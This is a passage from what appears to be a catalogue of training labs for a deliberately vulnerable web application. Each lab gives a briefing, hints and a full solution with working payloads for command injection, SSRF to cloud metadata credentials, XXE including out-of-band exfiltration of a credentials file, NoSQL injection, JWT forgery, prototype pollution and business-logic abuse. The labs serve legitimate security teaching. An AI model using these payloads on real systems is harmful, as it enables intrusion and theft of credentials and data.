- **Path:** `/labs/cmd-injection`
- **Domain / category:** Command Injection / Injection
- **Difficulty:** Easy (L2), 150 points
- **Estimated time:** 25 minutes
- **Technology:** Node.js, Express, Command line
- **Prerequisites:** `sqli-login`
- **Threat mapping:** A03:2021 - Injection; ASVS V5.3.8; WSTG-INPV-12; CWE-78; MITRE ATT&CK T1059

A diagnostics tool passes unsanitised input to a shell.

**Briefing:** The network diagnostics page builds a ping command from the host field. Break out of the intended argument and execute a second command that reads the flag file from the tool working directory.

**Objectives:**
- Identify a shell metacharacter injection point
- Execute a second command in the target context
- Read flag.txt and submit the flag

**Hints:**
1. The command is ping -c 1 <host>. Semicolons and command substitutions are interpreted by the shell.
2. Try 127.0.0.1; cat flag.txt or 127.0.0.1 && cat flag.txt.

**Solution:** Submit 127.0.0.1; cat flag.txt in the host field. The virtual shell executes both commands and prints the flag from the lab working directory.

### 19. SSRF to Cloud Metadata Service

- **Slug:** `ssrf-metadata`
- **Path:** `/labs/ssrf-metadata`
- **Domain / category:** SSRF / Server-Side Request Forgery
- **Difficulty:** Intermediate (L3), 250 points
- **Estimated time:** 35 minutes
- **Technology:** Node.js, Express, Cloud metadata
- **Prerequisites:** `cmd-injection`
- **Threat mapping:** A10:2021 - Server-Side Request Forgery; ASVS V12.6.1; WSTG-INPV-19; CWE-918; MITRE ATT&CK T1552.005

An avatar-from-URL importer fetches any URL server-side.

**Briefing:** The avatar importer fetches a URL from the server and returns the response body. A simulated cloud metadata service is reachable only from the server network at 169.254.169.254. Walk the metadata paths to recover the instance credential flag.

**Objectives:**
- Confirm server-side fetching of user-controlled URLs
- Enumerate the simulated metadata service paths
- Retrieve the credential document containing the flag

**Hints:**
1. Metadata services expose directory listings first. Start at http://169.254.169.254/latest/meta-data/.
2. Follow the iam/security-credentials/ path to the role name, then request the role credentials.

**Solution:** Submit http://169.254.169.254/latest/meta-data/iam/security-credentials/ to get the role name, then fetch the role path. The simulated credential JSON includes the flag.

### 20. SSRF via Webhook Tester

- **Slug:** `ssrf-webhook`
- **Path:** `/labs/ssrf-webhook`
- **Domain / category:** SSRF / Server-Side Request Forgery
- **Difficulty:** Intermediate (L3), 250 points
- **Estimated time:** 35 minutes
- **Technology:** Node.js, Express, Internal services
- **Prerequisites:** `ssrf-metadata`
- **Threat mapping:** A10:2021 - Server-Side Request Forgery; ASVS V12.6.1; WSTG-INPV-19; CWE-918; MITRE ATT&CK T1552.005

A webhook tester reaches an internal-only admin API.

**Briefing:** The webhook tester fetches any URL. An internal admin service resolves only inside the lab network at internal-admin.local. Enumerate its endpoints and read the flag.

**Objectives:**
- Identify that the tester performs server-side requests
- Reach an internal-only host through the SSRF
- Read the internal admin flag endpoint

**Hints:**
1. Try http://internal-admin.local/internal/admin/status first.
2. The flag endpoint is under the same internal path namespace.

**Solution:** Submit http://internal-admin.local/internal/admin/flag as the webhook URL. The internal handler returns JSON containing the flag.

### 21. SSRF via PDF Generation

- **Slug:** `ssrf-pdf-generator`
- **Path:** `/labs/ssrf-pdf-generator`
- **Domain / category:** SSRF / Server-Side Request Forgery
- **Difficulty:** Intermediate (L3), 250 points
- **Estimated time:** 35 minutes
- **Technology:** Node.js, Express, HTML rendering
- **Prerequisites:** `ssrf-webhook`
- **Threat mapping:** A10:2021 - Server-Side Request Forgery; ASVS V12.6.1; WSTG-INPV-19; CWE-918; MITRE ATT&CK T1552.005

An invoice PDF renderer fetches image sources server-side.

**Briefing:** The invoice renderer parses <img src> values from your HTML and fetches them from the server to compose the PDF. A simulated internal config host at pdf-internal.local contains the flag. Point an image source at it.

**Objectives:**
- Locate the server-side image fetch
- Point the fetcher at an internal-only host
- Read the internal config and capture the flag

**Hints:**
1. Only the first <img src="..."> is fetched by the renderer.
2. The internal config is at http://pdf-internal.local/config.

**Solution:** Submit invoice HTML containing <img src="http://pdf-internal.local/config">. The renderer fetches the internal config and displays the response body, including the flag.

### 22. XXE via Profile Import

- **Slug:** `xxe-profile-import`
- **Path:** `/labs/xxe-profile-import`
- **Domain / category:** XXE / Security Misconfiguration
- **Difficulty:** Intermediate (L3), 250 points
- **Estimated time:** 35 minutes
- **Technology:** Node.js, Express, XML
- **Prerequisites:** `ssrf-pdf-generator`
- **Threat mapping:** A05:2021 - Security Misconfiguration; ASVS V5.5.2; WSTG-INPV-07; CWE-611; MITRE ATT&CK T1190

A profile importer parses XML with external entities enabled.

**Briefing:** The profile importer resolves SYSTEM entities in uploaded XML. Define an entity that reads a local file inside the lab sandbox and reflect it through the displayName field.

**Objectives:**
- Confirm that DOCTYPE and SYSTEM entities are processed
- Read a file from the lab working directory
- Reflect the file contents into the profile response

**Hints:**
1. Define <!ENTITY xxe SYSTEM "file://secret.txt"> and reference &xxe; inside displayName.
2. The lab sandbox contains secret.txt in the import working directory.

**Solution:** Submit XML with <!ENTITY xxe SYSTEM "file://secret.txt"> and <displayName>&xxe;</displayName>. The importer resolves the entity and renders the flag.

### 23. XXE via SVG Upload

- **Slug:** `xxe-svg-upload`
- **Path:** `/labs/xxe-svg-upload`
- **Domain / category:** XXE / Security Misconfiguration
- **Difficulty:** Intermediate (L3), 250 points
- **Estimated time:** 35 minutes
- **Technology:** Node.js, Express, SVG, XML
- **Prerequisites:** `xxe-profile-import`
- **Threat mapping:** A05:2021 - Security Misconfiguration; ASVS V5.5.2; WSTG-INPV-07; CWE-611; MITRE ATT&CK T1190

SVG avatar processing resolves external entities too.

**Briefing:** The SVG sanitizer parses XML with the same unsafe entity resolver as the profile importer. Use a DOCTYPE entity inside the SVG title to read a local flag file.

**Objectives:**
- Treat SVG as XML rather than an image
- Inject a SYSTEM entity into the SVG document
- Read flag.txt through the reflected title

**Hints:**
1. The parser scans for <!ENTITY name SYSTEM "uri"> and substitutes &name;.
2. Use file://flag.txt and put &xxe; inside <title>.

**Solution:** Submit an SVG with <!ENTITY xxe SYSTEM "file://flag.txt"> and <title>&xxe;</title>. The importer resolves the entity and displays the flag in the alt text.

### 24. Blind XXE via Out-of-Band Exfiltration

- **Slug:** `xxe-oob-exfil`
- **Path:** `/labs/xxe-oob-exfil`
- **Domain / category:** XXE / Security Misconfiguration
- **Difficulty:** Insane (L6), 600 points
- **Estimated time:** 90 minutes
- **Technology:** Node.js, Express, XML, DTD
- **Prerequisites:** `xxe-svg-upload`
- **Threat mapping:** A05:2021 - Security Misconfiguration; ASVS V5.5.2; WSTG-INPV-07; CWE-611; MITRE ATT&CK T1190

Nothing is reflected: exfiltrate data through a self-hosted DTD.

**Briefing:** The importer processes parsed XML but returns no entity values. Host a malicious DTD on the lab collector endpoint, have the target fetch it, and make the DTD send a local file to your collector. Recover the flag from the out-of-band callback.

**Objectives:**
- Design a two-stage blind XXE payload
- Host a malicious DTD that reads a local file and builds an exfiltration URL
- Capture the out-of-band request and extract the flag

**Hints:**
1. The DTD must be fetched by the target, so use the lab evil.dtd endpoint as the SYSTEM identifier.
2. Inside the DTD, define an entity for db_credentials.conf and reference it in a second SYSTEM URL that points to /collector?data=...

**Solution:** Submit XML with <!DOCTYPE r [<!ENTITY % remote SYSTEM "http://<host>/labs/xxe-oob-exfil/evil.dtd">%remote;]>. Save a DTD that defines <!ENTITY % file SYSTEM "file://db_credentials.conf"> and <!ENTITY % exfil SYSTEM "http://<host>/labs/xxe-oob-exfil/collector?data=%file;"> with %exfil;. The collector receives the file contents and the lab reveals the flag.

### 25. Server-Side Template Injection

- **Slug:** `ssti-render`
- **Path:** `/labs/ssti-render`
- **Domain / category:** Server-Side Template Injection / Injection
- **Difficulty:** Hard (L4), 350 points
- **Estimated time:** 40 minutes
- **Technology:** Node.js, Express, JavaScript templates
- **Prerequisites:** `cmd-injection`
- **Threat mapping:** A03:2021 - Injection; ASVS V5.3.4; WSTG-INPV-18; CWE-1336; MITRE ATT&CK T1190

A greeting card generator evaluates your message as a template.

**Briefing:** The greeting card renderer inserts your message into a JavaScript template literal, then evaluates the result in an isolated sandbox. Break out of the data context and call the server-side flag() function.

**Objectives:**
- Distinguish template injection from plain text reflection
- Evaluate an expression in the template context
- Call the server-side flag() function

**Hints:**
1. Your message is placed inside a template literal, so ${...} is evaluated as JavaScript.
2. A flag() function is in scope. Try a message containing ${flag()}.

**Solution:** Submit a message containing ${flag()}. The template renderer evaluates the expression in its isolated context and writes the returned flag into the greeting card output.

### 26. Insecure Deserialization in a Session Cookie

- **Slug:** `insecure-deserialization`
- **Path:** `/labs/insecure-deserialization`
- **Domain / category:** Insecure Deserialization / Software and Data Integrity Failures
- **Difficulty:** Hard (L4), 350 points
- **Estimated time:** 40 minutes
- **Technology:** Node.js, Express, Base64, JSON
- **Prerequisites:** `jwt-alg-none`
- **Threat mapping:** A08:2021 - Software and Data Integrity Failures; ASVS V3.4.1; WSTG-SESS-03; CWE-502; MITRE ATT&CK T1550.004

A remember-me cookie is unsigned base64 JSON the server trusts.

**Briefing:** The remember-me cookie is base64-encoded JSON with no signature. The application deserialises it on every request and trusts the role field. Tamper with the object to become an administrator.

**Objectives:**
- Decode and inspect the cookie structure
- Modify the trusted role field
- Present the forged cookie and capture the flag

**Hints:**
1. The cookie value is base64url JSON. Decode it in a terminal or browser console.
2. Change role to admin, re-encode, and set the _sess_prefs cookie.

**Solution:** Decode _sess_prefs, change {"role":"user"} to {"role":"admin"}, base64-encode it, and set the cookie. The page trusts the deserialized role and returns the flag.

### 27. JWT alg:none Authentication Bypass

- **Slug:** `jwt-alg-none`
- **Path:** `/labs/jwt-alg-none`
- **Domain / category:** Authentication / Identification and Authentication Failures
- **Difficulty:** Hard (L4), 350 points
- **Estimated time:** 40 minutes
- **Technology:** Node.js, Express, JWT
- **Prerequisites:** None
- **Threat mapping:** A07:2021 - Identification and Authentication Failures; ASVS V2.10.3; WSTG-SESS-10; CWE-347; MITRE ATT&CK T1550.001

The API accepts alg:none tokens, skipping signature checks.

**Briefing:** The lab verifier trusts the alg header from the token. Change the algorithm to none, edit the payload role to admin, and remove the signature segment.

**Objectives:**
- Understand JWT structure: header, payload, signature
- Forge an unsigned token with an admin role
- Present the token to the verifier and recover the flag

**Hints:**
1. A JWT has three dot-separated base64url segments. The third is the signature.
2. Set the header alg to none, set payload role to admin, and leave the signature segment empty.

**Solution:** Log in as guest to obtain a token. Decode the header and payload, change alg to none and role to admin, re-encode both, and submit header.payload. with an empty signature. The verifier returns the flag.

### 28. JWT Signed with a Weak Secret

- **Slug:** `jwt-weak-secret`
- **Path:** `/labs/jwt-weak-secret`
- **Domain / category:** Authentication / Identification and Authentication Failures
- **Difficulty:** Hard (L4), 350 points
- **Estimated time:** 45 minutes
- **Technology:** Node.js, Express, JWT, HMAC
- **Prerequisites:** `jwt-alg-none`
- **Threat mapping:** A07:2021 - Identification and Authentication Failures; ASVS V2.10.3; WSTG-SESS-10; CWE-798; MITRE ATT&CK T1110.002

Signature verification is real, but the HMAC secret is guessable.

**Briefing:** The token signature is verified with HS256. The secret was chosen from a short list of placeholder passwords. Crack the secret, forge an admin token with a valid signature, and present it.

**Objectives:**
- Obtain a valid user token
- Crack the HS256 secret with a small wordlist
- Forge and sign an admin token

**Hints:**
1. The guest credentials are guest / guest123. The issued token is a normal HS256 JWT.
2. Try the common placeholder secrets letmein123, changeme, secret and jwtsecret.

**Solution:** Use a JWT cracker against the guest token with a short wordlist. The secret is letmein123. Sign {"username":"admin","role":"admin"} with HS256 and the cracked secret, then submit it to /verify.

### 29. Predictable Password Reset Tokens

- **Slug:** `broken-password-reset`
- **Path:** `/labs/broken-password-reset`
- **Domain / category:** Authentication / Identification and Authentication Failures
- **Difficulty:** Easy (L2), 150 points
- **Estimated time:** 25 minutes
- **Technology:** Node.js, Express, Authentication
- **Prerequisites:** `no-rate-limit-bruteforce`
- **Threat mapping:** A07:2021 - Identification and Authentication Failures; ASVS V2.5.2; WSTG-ATHN-09; CWE-330; MITRE ATT&CK T1110

Reset tokens are a sequential counter, not cryptographically random.

**Briefing:** The password reset service issues tokens such as RST-1001 from a shared counter. Request a reset for your own guest account to learn the format, then request one for the administrator and predict it.

**Objectives:**
- Observe the reset token format
- Predict the administrator token from the counter
- Complete the admin reset and capture the flag

**Hints:**
1. Request a reset for guest and note the RST- number.
2. Request a reset for admin next. The token is the next integer in the same sequence.

**Solution:** Request a guest reset to see RST-N. Request an admin reset, then complete the reset with RST-N+1 and any new password. The admin reset response reveals the flag.

### 30. User Enumeration via Timing Side-Channel

- **Slug:** `account-enum-timing`
- **Path:** `/labs/account-enum-timing`
- **Domain / category:** Authentication / Identification and Authentication Failures
- **Difficulty:** Advanced (L5), 450 points
- **Estimated time:** 60 minutes
- **Technology:** Node.js, Express, bcrypt, Timing analysis
- **Prerequisites:** `broken-password-reset`
- **Threat mapping:** A07:2021 - Identification and Authentication Failures; ASVS V2.2.1; WSTG-ATHN-04; CWE-208; MITRE ATT&CK T1589.001

Identical errors, but real bcrypt work leaks valid usernames.

**Briefing:** The login endpoint returns the same message for every account. Password verification only runs when the username exists, creating a measurable timing difference. Identify the hidden service account from the candidate list and use it to unlock the audit flag.

**Objectives:**
- Measure response-time differences across candidate usernames
- Identify the single valid service account
- Present the account name to the audit endpoint and capture the flag

**Hints:**
1. Real bcrypt hashing only runs when the username exists. Compare several samples per candidate to reduce noise.
2. The valid account is one of svc-backup, svc-deploy, svc-monitor, svc-ldap, svc-ci, svc-vault, svc-ops, svc-mail, svc-db, svc-web, svc-proxy, svc-dns.

**Solution:** Send repeated login requests for each candidate and average the response time. The valid service account takes noticeably longer. POST its name to /labs/account-enum-timing/unlock to receive the flag.

### 31. Missing Rate Limiting on PIN Login

- **Slug:** `no-rate-limit-bruteforce`
- **Path:** `/labs/no-rate-limit-bruteforce`
- **Domain / category:** Authentication / Identification and Authentication Failures
- **Difficulty:** Beginner (L1), 100 points
- **Estimated time:** 15 minutes
- **Technology:** Node.js, Express, Automation
- **Prerequisites:** None
- **Threat mapping:** A07:2021 - Identification and Authentication Failures; ASVS V2.2.1; WSTG-ATHN-03; CWE-307; MITRE ATT&CK T1110.001

A four-digit PIN with 10,000 combinations and zero throttling.

**Briefing:** The lab issues a random four-digit PIN for your instance. The verification endpoint has no rate limit, lockout or CAPTCHA. Automate the search space and recover the PIN.

**Objectives:**
- Confirm the PIN space and the absence of a lockout
- Automate PIN guesses against the endpoint
- Submit the correct PIN and capture the flag

**Hints:**
1. There are only 10,000 possible values from 0000 to 9999.
2. Use a simple loop or Burp Intruder against POST /labs/no-rate-limit-bruteforce/try-pin.

**Solution:** Loop pin=0000 through 9999 against /labs/no-rate-limit-bruteforce/try-pin. The response for the correct four-digit PIN contains the instance flag.

### 32. 2FA Logic Bypass

- **Slug:** `two-factor-bypass`
- **Path:** `/labs/two-factor-bypass`
- **Domain / category:** Authentication / Identification and Authentication Failures
- **Difficulty:** Easy (L2), 150 points
- **Estimated time:** 25 minutes
- **Technology:** Node.js, Express, Authentication
- **Prerequisites:** `broken-password-reset`
- **Threat mapping:** A07:2021 - Identification and Authentication Failures; ASVS V2.8.3; WSTG-ATHN-10; CWE-287; MITRE ATT&CK T1556

A leftover client-trusted field skips real OTP verification.

**Briefing:** Step one authenticates the administrator account. Step two verifies a one-time code, but the handler still honours a legacy debugSkip field. Inspect the request and bypass the second factor.

**Objectives:**
- Complete the first authentication step
- Inspect the OTP verification request and its accepted fields
- Bypass the second factor and capture the flag

**Hints:**
1. The first-step credentials are admin / adminpass.
2. Add debugSkip=true to the step-two request body even though the UI does not show it.

**Solution:** POST username=admin&password=adminpass to /step1, then POST otp=000000&debugSkip=true to /step2. The legacy debug field bypasses OTP verification and returns the flag.

### 33. NoSQL Injection: Login Bypass

- **Slug:** `nosql-login-bypass`
- **Path:** `/labs/nosql-login-bypass`
- **Domain / category:** NoSQL Injection / Injection
- **Difficulty:** Easy (L2), 150 points
- **Estimated time:** 25 minutes
- **Technology:** Node.js, Express, MongoDB
- **Prerequisites:** `sqli-login`
- **Threat mapping:** A03:2021 - Injection; ASVS V5.3.4; WSTG-INPV-05; CWE-943; MITRE ATT&CK T1190

A JSON login body lets you send operators instead of strings.

**Briefing:** The JSON login endpoint passes the request body straight into a MongoDB query filter. Send an object instead of a password string to turn the equality check into an operator expression.

**Objectives:**
- Identify that JSON types reach the database query
- Use a MongoDB comparison operator to match the admin account
- Retrieve the flag from the authenticated admin session

**Hints:**
1. The query is LabData.findOne({ username, password }) scoped to your instance.
2. Send {"username":"admin","password":{"$ne":null}} to /labs/nosql-login-bypass/login.

**Solution:** POST JSON with username admin and password {"$ne":null}. MongoDB evaluates the operator, matches the admin record, and the lab returns the admin flag.

### 34. NoSQL Injection: Query-String Operators

- **Slug:** `nosql-search-injection`
- **Path:** `/labs/nosql-search-injection`
- **Domain / category:** NoSQL Injection / Injection
- **Difficulty:** Easy (L2), 150 points
- **Estimated time:** 25 minutes
- **Technology:** Node.js, Express, MongoDB
- **Prerequisites:** `nosql-login-bypass`
- **Threat mapping:** A03:2021 - Injection; ASVS V5.3.4; WSTG-INPV-05; CWE-943; MITRE ATT&CK T1190

Bracket-notation query parameters merge into a Mongo filter.

**Briefing:** The product search takes query-string parameters and merges them into a MongoDB filter. Express parses bracket notation into nested objects. Override the released filter to reveal an unreleased product with the flag.

**Objectives:**
- Understand Express query-string parsing of bracket syntax
- Inject a MongoDB operator into the released filter
- Read the unreleased product and capture the flag

**Hints:**
1. The filter starts with released:true and then merges query parameters.
2. Try /labs/nosql-search-injection?released[$ne]=true or released=false.

**Solution:** Request /labs/nosql-search-injection?released[$ne]=true. The merged filter matches both released and unreleased products, exposing the prototype record containing the flag.

### 35. NoSQL Injection: Blind $regex Extraction

- **Slug:** `nosql-regex-extraction`
- **Path:** `/labs/nosql-regex-extraction`
- **Domain / category:** NoSQL Injection / Injection
- **Difficulty:** Intermediate (L3), 250 points
- **Estimated time:** 45 minutes
- **Technology:** Node.js, Express, MongoDB, Regex
- **Prerequisites:** `nosql-search-injection`
- **Threat mapping:** A03:2021 - Injection; ASVS V5.3.4; WSTG-INPV-05; CWE-943; MITRE ATT&CK T1190

A pattern-check endpoint passes your input into $regex.

**Briefing:** The access-code validator wraps your input in a MongoDB $regex query and only returns a match/no-match result. Use anchored patterns to extract the stored code one character at a time.

**Objectives:**
- Confirm that regex metacharacters are interpreted by MongoDB
- Build an anchored character-by-character oracle
- Extract the complete access code and submit it as the flag

**Hints:**
1. The query is { "data.code": { $regex: <input> } } scoped to your instance.
2. Start with ^Z, then ^ZD, then ^ZDS and extend one accepted character at a time.

**Solution:** Submit anchored regexes such as ^Z, ^ZD, ^ZDS and extend one character whenever the response is a match. The recovered access code is the flag.

### 36. NoSQL Injection: $expr Aggregation Abuse

- **Slug:** `nosql-expr-injection`
- **Path:** `/labs/nosql-expr-injection`
- **Domain / category:** NoSQL Injection / Injection
- **Difficulty:** Advanced (L5), 450 points
- **Estimated time:** 60 minutes
- **Technology:** Node.js, Express, MongoDB, Aggregation
- **Prerequisites:** `nosql-regex-extraction`
- **Threat mapping:** A03:2021 - Injection; ASVS V5.3.4; WSTG-INPV-05; CWE-943; MITRE ATT&CK T1190

A raw filter fragment is merged into a real query, $expr included.

**Briefing:** The vault probe merges your JSON filter into a real MongoDB query. Use the $expr aggregation operator to compare hidden fields against guesses and recover the vault secret byte by byte.

**Objectives:**
- Confirm that arbitrary query operators are accepted
- Use $expr and string operators to compare the hidden secret
- Recover the full vault secret and submit it

**Hints:**
1. The filter fragment is spread into the query object. $expr is accepted.
2. Use {"$expr":{"$gt":[{"$substrCP":["$data.secret",0,1]},"M"]}} to compare the first character.

**Solution:** Send $expr filters that compare {$substrCP:["$data.secret",index,1]} against guesses. Binary-search each character until the full secret is known. The secret is the flag.

### 37. Prototype Pollution to Privilege Escalation

- **Slug:** `prototype-pollution`
- **Path:** `/labs/prototype-pollution`
- **Domain / category:** Prototype Pollution / Software and Data Integrity Failures
- **Difficulty:** Advanced (L5), 450 points
- **Estimated time:** 60 minutes
- **Technology:** Node.js, Express, JavaScript
- **Prerequisites:** `nosql-expr-injection`
- **Threat mapping:** A08:2021 - Software and Data Integrity Failures; ASVS V5.5.1; WSTG-INPV-06; CWE-1321; MITRE ATT&CK T1190

A recursive merge reaches __proto__ with no key filtering.

**Briefing:** The preferences saver recursively merges JSON into an object. It does not filter __proto__. Pollute the instance sandbox prototype with isAdmin=true and let a freshly created object inherit the privileged property.

**Objectives:**
- Understand prototype chains and inherited properties
- Reach the prototype through a recursive merge
- Make the application consider a new object an administrator

**Hints:**
1. JSON.parse creates an own __proto__ property when it appears in the document.
2. Send {"__proto__":{"isAdmin":true}} to /labs/prototype-pollution/merge.

**Solution:** Submit {"__proto__":{"isAdmin":true}}. The recursive merge writes isAdmin onto the instance sandbox prototype. The freshly created object inherits it, passes the admin check, and the flag is returned.

### 38. API: Excessive Data Exposure

- **Slug:** `api-excessive-data`
- **Path:** `/labs/api-excessive-data`
- **Domain / category:** API Security / API Security
- **Difficulty:** Beginner (L1), 100 points
- **Estimated time:** 15 minutes
- **Technology:** Node.js, Express, MongoDB, JSON
- **Prerequisites:** None
- **Threat mapping:** A01:2021 - Broken Access Control; ASVS V4.3.1; WSTG-ATHZ-04; CWE-213; MITRE ATT&CK T1213

The API returns the full backing document, not just safe fields.

**Briefing:** The profile card only displays a name and job title, but the API returns the entire user document. Inspect the raw JSON response to find internal notes and the flag.

**Objectives:**
- Inspect raw API responses instead of rendered UI
- Identify fields the client does not need
- Recover the flag from an internal field

**Hints:**
1. Open the browser Network tab or request /labs/api-excessive-data/api/profile/u_2291 directly.
2. Look beyond the name and title fields.

**Solution:** Request /labs/api-excessive-data/api/profile/u_2291 and inspect the full JSON. internalNotes contains the flag.

### 39. API: Broken Object Level Authorization

- **Slug:** `api-bola`
- **Path:** `/labs/api-bola`
- **Domain / category:** API Security / API Security
- **Difficulty:** Easy (L2), 150 points
- **Estimated time:** 25 minutes
- **Technology:** Node.js, Express, MongoDB, REST
- **Prerequisites:** `api-excessive-data`
- **Threat mapping:** A01:2021 - Broken Access Control; ASVS V4.1.3; WSTG-ATHZ-04; CWE-639; MITRE ATT&CK T1078

The orders API trusts the :id in the URL with no ownership check.

**Briefing:** The orders API returns an order by ID without checking the caller. Your account owns ord_1001, but sequential order IDs belong to other customers. Find the order with the flag.

**Objectives:**
- Recognise BOLA in a REST resource route
- Enumerate sequential order identifiers
- Read another customer order and capture the flag

**Hints:**
1. Order IDs are sequential: ord_1001, ord_1002, ord_1003, ord_1004.
2. Your order is ord_1001. Request the others through /labs/api-bola/api/orders/<id>.

**Solution:** Request /labs/api-bola/api/orders/ord_1002. The API does not check ownership and the order notes contain the flag.

### 40. API: Mass Assignment on PATCH

- **Slug:** `api-mass-assignment`
- **Path:** `/labs/api-mass-assignment`
- **Domain / category:** API Security / API Security
- **Difficulty:** Easy (L2), 150 points
- **Estimated time:** 25 minutes
- **Technology:** Node.js, Express, MongoDB, REST
- **Prerequisites:** `api-bola`
- **Threat mapping:** A01:2021 - Broken Access Control; ASVS V4.2.1; WSTG-ATHZ-03; CWE-915; MITRE ATT&CK T1078

A PATCH endpoint merges the entire request body, unfiltered.

**Briefing:** The account API only documents displayName, but the PATCH handler merges every field in the JSON body. Add the accountTier field and upgrade your own account.

**Objectives:**
- Inspect the documented PATCH body versus accepted fields
- Add a privileged account field
- Upgrade to enterprise tier and capture the flag

**Hints:**
1. The UI sends only {"displayName":"..."} to PATCH /labs/api-mass-assignment/api/account.
2. Include "accountTier":"enterprise" in the JSON body.

**Solution:** PATCH /labs/api-mass-assignment/api/account with {"displayName":"guest","accountTier":"enterprise"}. The generic merge applies the privileged field and the page reveals the flag.

### 41. GraphQL Introspection Enabled

- **Slug:** `graphql-introspection`
- **Path:** `/labs/graphql-introspection`
- **Domain / category:** API Security / API Security
- **Difficulty:** Easy (L2), 150 points
- **Estimated time:** 25 minutes
- **Technology:** Node.js, Express, GraphQL
- **Prerequisites:** `api-excessive-data`
- **Threat mapping:** A01:2021 - Broken Access Control; ASVS V13.4.1; WSTG-APIT-01; CWE-200; MITRE ATT&CK T1213

Introspection reveals fields never used by a real client.

**Briefing:** The GraphQL endpoint has introspection enabled. Query the schema to discover an internal debug field that the UI never uses, then query that field for the flag.

**Objectives:**
- Use __schema introspection to map the API
- Identify an undocumented sensitive field
- Query the field and capture the flag

**Hints:**
1. Send {"query":"{ __schema { fields { name description } } }"} to /labs/graphql-introspection/graphql.
2. The internalDebugFlag field is listed but not used by the UI.

**Solution:** Run the introspection query, find internalDebugFlag, then send {"query":"{ internalDebugFlag }"}. The resolver returns the instance flag.

### 42. Business Logic: Negative Quantity

- **Slug:** `logic-negative-quantity`
- **Path:** `/labs/logic-negative-quantity`
- **Domain / category:** Business Logic / Business Logic
- **Difficulty:** Beginner (L1), 100 points
- **Estimated time:** 15 minutes
- **Technology:** Node.js, Express
- **Prerequisites:** None
- **Threat mapping:** A04:2021 - Insecure Design; ASVS V11.1.1; WSTG-BUSL-01; CWE-840; MITRE ATT&CK T1190

Checkout accepts negative quantities with no lower bound.

**Briefing:** The checkout multiplies quantity by a fixed unit price and subtracts the total from your balance. A negative quantity creates a refund instead of a purchase. Push the balance above 500.

**Objectives:**
- Identify a missing server-side bounds check
- Use a negative quantity to invert the transaction
- Raise the balance above the reward threshold

**Hints:**
1. The HTML input may set min="1", but the server does not enforce it.
2. Submit quantity=-10 and watch the balance increase.

**Solution:** Submit a negative quantity such as -10. The total becomes negative, the balance increases by the refund, and once it exceeds 500 the flag is displayed.

### 43. Business Logic: Client-Trusted Price

- **Slug:** `logic-price-tampering`
- **Path:** `/labs/logic-price-tampering`
- **Domain / category:** Business Logic / Business Logic
- **Difficulty:** Beginner (L1), 100 points
- **Estimated time:** 15 minutes
- **Technology:** Node.js, Express, HTML forms
- **Prerequisites:** None
- **Threat mapping:** A04:2021 - Insecure Design; ASVS V11.1.2; WSTG-BUSL-01; CWE-602; MITRE ATT&CK T1190

A hidden form field carries the price the server actually charges.

**Briefing:** The checkout form includes a hidden price field. The server charges whatever value the client submits instead of looking up the catalogue price. Change the price before submitting.

**Objectives:**
- Find the hidden client-controlled price
- Modify the request before it reaches the server
- Complete the order below the reward threshold

**Hints:**
1. Inspect the checkout form source for a hidden input named price.
2. Use devtools or curl to submit price=1.

**Solution:** Change the hidden price field to a value below 10 and submit the checkout. The server charges the tampered amount and returns the flag.

### 44. Business Logic: Skipping the Payment Step

- **Slug:** `logic-workflow-skip`
- **Path:** `/labs/logic-workflow-skip`
- **Domain / category:** Business Logic / Business Logic
- **Difficulty:** Easy (L2), 150 points
- **Estimated time:** 25 minutes
- **Technology:** Node.js, Express
- **Prerequisites:** `logic-price-tampering`
- **Threat mapping:** A04:2021 - Insecure Design; ASVS V11.1.1; WSTG-BUSL-01; CWE-841; MITRE ATT&CK T1190

The confirm-order step never checks that payment succeeded.

**Briefing:** The UI enforces a three-step checkout, but the confirm endpoint does not verify payment state. The Pay button always declines. Call confirm directly and complete the order without paying.

**Objectives:**
- Map the workflow steps and their server-side checks
- Invoke the final step out of order
- Confirm an unpaid order and capture the flag

**Hints:**
1. The Pay button declines by design, but the confirm route is a separate request.
2. POST directly to /labs/logic-workflow-skip/confirm.

**Solution:** Send POST /labs/logic-workflow-skip/confirm without paying. The handler sets orderConfirmed while paymentCompleted remains false, and the page reveals the flag.

### 45. Business Logic: Race Condition on Coupon Redemption

- **Slug:** `logic-coupon-race`
- **Path:** `/labs/logic-coupon-race`
- **Domain / category:** Business Logic / Business Logic
- **Difficulty:** Advanced (L5), 450 points
- **Estimated time:** 60 minutes
- **Technology:** Node.js, Express, MongoDB, Concurrency
- **Prerequisites:** `logic-workflow-skip`
- **Threat mapping:** A04:2021 - Insecure Design; ASVS V11.1.4; WSTG-BUSL-04; CWE-362; MITRE ATT&CK T1190

A single-use coupon can be redeemed more than once, concurrently.

**Briefing:** The redemption handler reads usesRemaining, waits, then writes the decrement. The read-modify-write is not atomic. Fire several concurrent redeem requests so more than one passes the check.

**Objectives:**
- Identify a time-of-check to time-of-use race
- Send concurrent redemption requests
- Record more than one successful redemption

**Hints:**
1. The redeem endpoint waits 150ms between reading and saving the coupon.
2. Send several requests at the same time with curl, a script, or Burp Turbo Intruder.

**Solution:** Fire at least three POST /labs/logic-coupon-race/redeem requests concurrently. Multiple requests read usesRemaining=1 before any save, and the second successful redemption reveals the flag.

### 46. File Upload: Content-Type Allowlist Bypass

- **Slug:** `upload-content-type-bypass`
- **Path:** `/labs/upload-content-type-bypass`
- **Domain / category:** File Upload / Security Misconfiguration
- **Difficulty:** Easy (L2), 150 points
- **Estimated time:** 25 minutes
- **Technology:** Node.js, Express, File uploads
- **Prerequisites:** `svg-upload-xss`
- **Threat mapping:** A05:2021 - Security Misconfiguration; ASVS V12.2.1; WSTG-BUSL-09; CWE-646; MITRE ATT&CK T1608.002

Only the client-declared Content-Type header is checked.

**Briefing:** The avatar upload checks an X-Declared-Type header for image/png or image/jpeg. The actual bytes and extension are not validated. Upload an HTML document while declaring image/png, then view it as HTML.

**Objectives:**
- Understand why client-declared metadata is untrusted
- Upload an HTML file with an image Content-Type
- Get the file served as executable HTML and capture the flag

**Hints:**
1. The header is X-Declared-Type, and the filename is in the query string.
2. Declare image/png but name the file avatar.html and submit HTML content.

**Solution:** POST /labs/upload-content-type-bypass/upload?filename=avatar.html with X-Declared-Type: image/png and an HTML body. The server stores it by extension, serves it as text/html, and the file view reveals the flag.

### 47. File Upload: Path Traversal

- **Slug:** `upload-path-traversal`
- **Path:** `/labs/upload-path-traversal`
- **Domain / category:** File Upload / Security Misconfiguration
- **Difficulty:** Intermediate (L3), 250 points
- **Estimated time:** 30 minutes
- **Technology:** Node.js, Express, Filesystem
- **Prerequisites:** `upload-content-type-bypass`
